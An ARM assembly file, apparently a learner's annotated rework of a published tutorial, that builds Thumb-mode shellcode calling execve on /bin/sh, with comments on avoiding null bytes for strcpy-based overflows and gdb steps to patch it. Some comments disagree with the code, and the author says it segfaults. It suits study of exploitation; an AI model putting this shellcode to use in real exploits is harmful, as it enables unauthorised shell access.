
 /* This code was modified from Johnathan Salwan - twitter @jonathansalwan
    From his paper, How to create a shellcode on ARM architecture
    2010/11/25 */

/**********************************

    So this code will segfault since the last byte
    of the hex string is non null terminated.  Since 
    its all in the .text section it can not be fixed
    at runtime.  I get exceptions when I try to modify 
    the code.  Rather than try to write self modifiable code
    I'm just going to get the opcodes so I can get it into a 
    shell where its in the stack and then I will modify it.

    If you want to use it to get a shell in gdb, do this
    (gdb) set var  *(char *) 0x8073 = 0
	Verify the string is null terminated and at correct location.
    $r0 should be 0x806c
	(gdb) x/8xb 0x806c




*********************************/

/*
       arch/ABI   instruction          syscall #   retval Notes
       ───────────────────────────────────────────────────────────────────
       arm/EABI   swi 0x0              r7          r0

       arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
       ──────────────────────────────────────────────────────────────────
       arm/EABI      r0    r1    r2    r3    r4    r5    r6
*/

.section .text
.global _start
_start:
        /* This whole section is for thumb */
        /* He is simply branching to himself and switching to thumb */
        .code 32
        add     r3, pc, #1  
        bx      r3
        .code 16
        /* We place the address of pc in r0, so we can access the string in memory */
        mov     r0, pc
        mov     r0, pc

        /* and add 10 to it (which then makes it point to //bin/sh) */
        /* his original code used // to align on thumb required boundary */
        /* But the assembler I used did not add a null zero */
        add     r0, #18
        /* we place it on the stack (in case we need it again) */
        str     r0, [sp, #4]            

        /* we move what was on the stack to r1 */
        add r1, sp, #4

        /* we subtract r2 from itself (which is the same as */
        /* placing 0 in r2) */
        sub     r2, r2, r2

        /* syscall execve in r7 */
        /* from /usr/include/arm-linux-gnueabihf/asm/unistd.h
            #define __NR_write                      (__NR_SYSCALL_BASE+  4)
            #define __NR_execve                     (__NR_SYSCALL_BASE+ 11)
        */

        mov     r7, #11 

		/* the stack for exception handlers in thumb mode is different
		   than for arm mode. Try to switch back to arm mode
		*/

        mov     r3, pc  
        bx      r3

        /* we execute, He used svc 1 but this appears to be deprecated */
        /* Either works, but swi 0 will end the buffer when strcpy used */
		/* hmm. this did not work when i did the shell code bit though */
        /* svc     1  */ 
        /* swi     #0 */
        swi     #1 

/* modified this to have a null term zero */
/* he had a // here, but used 0xa offset. 0xa will break up input buffer */
/* I added a whole word space */
.byte 0x12,0x34,0x56,0x78
.ascii "/bin/shA"


